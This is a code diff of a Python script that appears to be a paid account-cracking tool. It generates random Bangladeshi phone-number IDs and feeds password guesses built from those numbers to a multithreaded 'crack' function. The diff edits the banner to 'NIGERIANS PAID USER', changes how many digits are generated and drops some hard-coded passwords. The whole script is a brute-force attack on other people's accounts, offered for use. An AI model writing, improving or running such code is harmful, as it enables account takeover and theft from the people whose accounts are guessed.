@@ -147,16 +147,10 @@ for txxxtt in range (1000):
 	ugen.append(ffg)
 #--------------------------(LOGO BOX)--------------------------#
 logo =("""     
-\033[1;32m                                           
-██       ██████  ███    ██  ██      ██    ██ 
-██      ██    ██ ████   ██  ██       ██  ██  
-██      ██    ██ ██ ██  ██  ██        ████   
-██      ██    ██ ██  ██ ██  ██         ██    
-███████  ██████  ██   ████  ███████    ██ 
 
-        \033[1;91m<═══\033[1;41m\033[1;97m TOOLS MAKE BY PINIK-XD\033[;0m\033[1;91m═══>\033[1;92m                              
+ \033[1;91m<═══\033[1;41m\033[1;97m TOOLS BY USE ONLY NIGERIANS PAID USER \033[;0m\033[1;91m═══>\033[1;92m                              
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
-\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46mTOOLS MAKE\033[1;31m● \x1b[38;5;46msumon roy
+\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46mTOOLS MAKE\033[1;31m● \x1b[38;5;46mSUMON ROY
 \033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46mVERSION  \033[1;31m ● \x1b[38;5;46mPREMIUM
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
 
@@ -197,14 +191,14 @@ def v2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] BD NUMBER  => 7679 7898 6798')
+    print('[+] BD NUMBER  => 767 789 679')
     kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
     print('[+] 2000. 5000. 10000. 15000. 50000')
     limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(2))
+        nmp = ''.join(random.choice(string.digits) for _ in range(3))
         user.append(nmp)
     with ThreadPool(max_workers=60) as akash:
         os.system('clear')
@@ -215,7 +209,7 @@ def v2():
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [uid[:6],uid[:8],uid,'57273200','57575751','59039200','57575752']
+            pwx = [uid[:6],uid[:8],uid]
             akash.submit(rcrack1,uid,pwx,tl)
     print(linex)
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
